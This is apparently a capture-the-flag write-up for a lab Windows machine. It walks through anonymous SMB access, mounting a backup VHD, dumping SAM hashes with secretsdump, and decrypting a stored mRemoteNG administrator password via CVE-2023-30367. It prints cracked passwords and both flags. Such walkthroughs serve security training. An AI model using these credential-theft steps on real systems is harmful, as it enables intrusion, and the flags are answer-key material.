# User

smb enum
`smbclient -N -L //10.129.136.29/`
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Anonymous login -> Backups share is accessible

```
smb: \> ls
  .                                   D        0  Tue Apr 16 12:02:11 2019
  ..                                  D        0  Tue Apr 16 12:02:11 2019
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 13:44:02 2019
```

`\WindowsImageBackup\L4mpje-PC\Backup`
There are two .vhd files
`9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd`
`9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`

Command for mounting a .vhd file via `guestmount`
`sudo guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/vhd`
```
┌──(root㉿lenovo-x11)-[/mnt/vhd]
└─# ls
'$Recycle.Bin'  'Documents and Settings'   ProgramData     'System Volume Information'
 autoexec.bat    pagefile.sys             'Program Files'   Users
 config.sys      PerfLogs                  Recovery         Windows
```

Dumping registry hives - `SYSTEM` and `SYSTEM`
```
impacket-secretsdump -sam SAM -sys SYSTEM LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```
L4mpje plaintext password `bureaulampje`

`ssh L4mpje@10.129.136.29`
```
 Directory of C:\Users\L4mpje\Desktop
22-02-2019  16:27    <DIR>          .
22-02-2019  16:27    <DIR>          ..                                                             
19-05-2026  17:57                34 user.txt                                                        
               1 File(s)             34 bytes                                                       
               2 Dir(s)   4.818.411.520 bytes free                                                  

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                
b998163f7546ee32ece48b35f8526fd0
```

user flag: `b998163f7546ee32ece48b35f8526fd0`

# Root

checking installed programs
```
    Directory: C:\Program Files (x86)                                                               


Mode                LastWriteTime         Length Name                                               
----                -------------         ------ ----                                               
d-----        16-7-2016     15:23                Common Files                                       
d-----        23-2-2019     09:38                Internet Explorer                                  
d-----        16-7-2016     15:23                Microsoft.NET                                      
da----        22-2-2019     14:01                *mRemoteNG*
```

mRemoteNG <= v1.76.20 and <= 1.77.3-dev versions are affected by this CVE: `CVE-2023-30367`

When looking at the source code of this   [POC](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper), I noticed that it looks for a file named `confConfs.xml` , that contains the password.

`C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confConfs.xml`
```xml
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                          
<?xml version="1.0" encoding="utf-8"?>Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">  
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44
d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeo
C0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP"
...
>

    
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-
e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/Jv
R1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostname="192.168.1.75" ...                                                                              
```
`aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==`

We'll use the password decryptor from the github POC repository
```
python3 mremoteng_decrypt.py -f ../nRemoteNG-password.txt
Password: thXLHM96BeKL0ER2
```

`ssh Administrator@10.129.136.29`
```
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                  
d610227c8009ef064a9ed726e216fec1
```
root flag: `d610227c8009ef064a9ed726e216fec1`

